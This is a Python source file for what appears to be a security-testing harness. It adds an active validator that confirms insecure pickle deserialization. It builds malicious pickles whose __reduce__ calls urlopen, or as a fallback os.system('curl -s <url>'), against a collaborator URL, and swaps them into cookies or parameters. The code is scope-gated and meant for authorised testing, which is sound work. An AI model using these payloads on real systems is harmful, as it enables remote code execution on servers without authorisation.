"""
Active insecure-deserialization confirmation leg (Python pickle, OOB).

The existing DeserializationValidator is deliberately PASSIVE: it fingerprints a
serialized-object FORMAT (Java/PHP/pickle/.NET) but declines to build a gadget
chain, because a working ysoserial/PHPGGC chain is weaponised code. This leg adds
the one active confirmation that stays on the safe side of that line -- the exact
posture the command-injection leg already uses:

  it proves EXECUTION out-of-band with a BENIGN beacon, not a destructive gadget.

For Python pickle specifically, a pickle whose `__reduce__` calls a stdlib fetch of
a unique collaborator URL proves the target deserialised attacker-controlled pickle
and executed the embedded callable -- confirmed deserialization RCE -- with a
payload whose ONLY effect is a loopback HTTP GET (it reads nothing, writes nothing,
destroys nothing; the callback is the whole payload). This is the deserialization
analogue of the command-injection leg's `curl <collaborator>` shell payload.

It fires only where a pickle SINK actually exists: a cookie/param whose current
value base64-decodes to pickle bytes. It replaces that value with the beacon
payload and watches for the callback. Scope-gated and, because it executes code on
the target, self-gated on validators.allow_mutating_replay regardless of HTTP
method (a GET that triggers RCE is still a state-changing action). No Java/PHP/.NET
payloads are built -- those have no gadget-free in-process proof, so they stay with
the passive format-confirmation validator.
"""
from __future__ import annotations

import base64
import os
import pickle
import urllib.request
from urllib.parse import urlsplit, parse_qsl

import httpx

import harness.collaborator as _collab
from harness import global_throttle
from harness.models import Finding, HttpExchange
from harness.safety_gate import GatedAsyncClient, get_default_gate, SafetyGateBlocked
from .base import Validator, ValidationResult
from .injection_targets import replay_headers

# Pickle protocol 2-5 frames start \x80 <proto>; protocol 0/1 are printable
# opcodes and always end with the STOP opcode '.'.
_PICKLE_PROTO_HEADERS = (b"\x80\x02", b"\x80\x03", b"\x80\x04", b"\x80\x05")


def _looks_like_pickle(raw: bytes) -> bool:
    if not raw:
        return False
    if raw[:2] in _PICKLE_PROTO_HEADERS or raw[:1] == b"\x80":
        return True
    # protocol 0/1: starts with a GLOBAL/MARK/DICT/LIST opcode and ends with STOP.
    return raw[:1] in (b"(", b"c", b"}", b"]", b"S") and raw.rstrip()[-1:] == b"."


def _b64_decodes_to_pickle(value: str) -> bool:
    v = (value or "").strip()
    if len(v) < 8:
        return False
    try:
        raw = base64.b64decode(v + "===", validate=False)
    except Exception:
        return False
    return _looks_like_pickle(raw)


class _Beacon:
    """Its pickle reduces to a stdlib call that fetches `url` -- so unpickling it
    on the target performs a single loopback HTTP GET (the OOB proof) and nothing
    else. The class itself is never referenced in the serialized bytes (reduce
    replaces it with the global callable), so the target needs no custom import."""

    def __init__(self, url: str):
        self.url = url

    def __reduce__(self):
        return (urllib.request.urlopen, (self.url,))


class _ShellBeacon:
    """Fallback for targets where the urlopen reference can't reconstruct but a
    shell is reachable: reduces to `os.system('curl -s <url>')`. Same benign
    loopback fetch; still no destructive action."""

    def __init__(self, url: str):
        self.url = url

    def __reduce__(self):
        return (os.system, (f"curl -s {self.url}",))


def _pickle_payload(url: str, shell: bool = False) -> str:
    obj = _ShellBeacon(url) if shell else _Beacon(url)
    return base64.b64encode(pickle.dumps(obj)).decode()


class DeserializationOobValidator(Validator):
    name = "deserialization_oob"
    finding_classes = {"deserialization", "insecure deserialization", "insecure_deserialization",
                       "pickle", "python pickle", "object injection"}
    active = True

    def __init__(self, *, allowed_hosts: list[str] | None = None, timeout: float = 10.0,
                 collaborator=None):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout
        self._collab = collaborator

    def collab(self):
        return self._collab or _collab.shared()

    def _sink_candidates(self, exchange: HttpExchange):
        """(location, name) points where a base64-pickle value currently lives --
        the deserialization sink to overwrite. Cookies first (the classic pickle
        sink), then query/body params."""
        out: list[tuple[str, str]] = []
        headers = exchange.request_headers or {}
        cookie = headers.get("Cookie") or headers.get("cookie")
        if cookie:
            for part in cookie.split(";"):
                if "=" in part:
                    n, _, v = part.strip().partition("=")
                    if _b64_decodes_to_pickle(v):
                        out.append(("cookie", n))
        for n, v in parse_qsl(urlsplit(exchange.url).query, keep_blank_values=True):
            if _b64_decodes_to_pickle(v):
                out.append(("query", n))
        body = exchange.request_body or ""
        if body and "=" in body and _b64_decodes_to_pickle(body.split("=", 1)[-1]):
            for n, v in parse_qsl(body, keep_blank_values=True):
                if _b64_decodes_to_pickle(v):
                    out.append(("body", n))
        return out

    def applies(self, finding: Finding, exchange: HttpExchange) -> bool:
        return super().applies(finding, exchange) and bool(self._sink_candidates(exchange))

    def _skip(self, why: str) -> ValidationResult:
        return ValidationResult(self.name, "skipped", "deserialization", summary=why)

    def _mutate(self, exchange: HttpExchange, loc: str, name: str, payload: str):
        """Return (url, headers, body) with the pickle sink `name` set to `payload`."""
        headers = replay_headers(exchange)
        url, body = exchange.url, exchange.request_body
        if loc == "cookie":
            cur = headers.get("Cookie") or headers.get("cookie") or ""
            parts = []
            for part in cur.split(";"):
                k = part.strip().partition("=")[0]
                parts.append(f"{name}={payload}" if k == name else part.strip())
            headers["Cookie"] = "; ".join(p for p in parts if p)
        elif loc == "query":
            sp = urlsplit(url)
            q = [(k, payload if k == name else v)
                 for k, v in parse_qsl(sp.query, keep_blank_values=True)]
            from urllib.parse import urlencode, urlunsplit
            url = urlunsplit((sp.scheme, sp.netloc, sp.path, urlencode(q), sp.fragment))
        elif loc == "body":
            from urllib.parse import urlencode
            pairs = [(k, payload if k == name else v)
                     for k, v in parse_qsl(body or "", keep_blank_values=True)]
            body = urlencode(pairs)
        return url, headers, body

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        host = urlsplit(exchange.url).hostname or ""
        if self.allowed_hosts and host not in self.allowed_hosts:
            return self._skip(f"host {host!r} out of scope")
        # Executing code on the target is strictly stronger than a read, so require
        # the mutating opt-in regardless of the HTTP method carrying the cookie.
        if not get_default_gate().config.allow_mutating_replay:
            return self._skip("deserialization RCE beacon requires validators.allow_mutating_replay")
        sinks = self._sink_candidates(exchange)
        if not sinks:
            return self._skip("no base64-pickle value present to overwrite (no deserialization sink)")

        collab = self.collab()
        method = (exchange.method or "GET").upper()
        for loc, name in sinks:
            for shell in (False, True):  # urlopen beacon first, then os.system(curl) fallback
                token = collab.token()
                payload = _pickle_payload(collab.url(token), shell=shell)
                url, headers, body = self._mutate(exchange, loc, name, payload)
                try:
                    await global_throttle.acquire()
                    async with GatedAsyncClient(get_default_gate(), self.name, timeout=self.timeout,
                                                follow_redirects=False, verify=False) as client:
                        await client.request(method, url, headers=headers or None,
                                             content=body or None)
                except SafetyGateBlocked:
                    return self._skip("mutating deserialization replay not authorized "
                                      "(validators.allow_mutating_replay)")
                except httpx.HTTPError:
                    continue
                if await collab.wait_for_hit(token, timeout=self.timeout):
                    kind = "os.system(curl)" if shell else "urllib fetch"
                    return ValidationResult(
                        self.name, "confirmed", "deserialization", confidence=0.95, confirmed=True,
                        summary=f"Insecure deserialization RCE confirmed: a pickle placed in the {loc} "
                                f"value {name!r} was deserialised and executed on the server.",
                        evidence=f"Replaced the base64-pickle {loc} {name!r} with a benign beacon "
                                 f"(pickle __reduce__ -> {kind} of a unique collaborator URL); the "
                                 f"target unpickled it and called back out-of-band. Proof of code "
                                 f"execution via deserialization -- no gadget chain, no destructive payload.")
        return ValidationResult(
            self.name, "not_confirmed", "deserialization", confidence=0.0, confirmed=False,
            summary="No out-of-band callback -- the pickle value does not appear to be deserialised unsafely",
            evidence=f"Overwrote {len(sinks)} pickle-shaped sink(s) with a benign beacon payload; "
                     f"no collaborator hit within the window.")
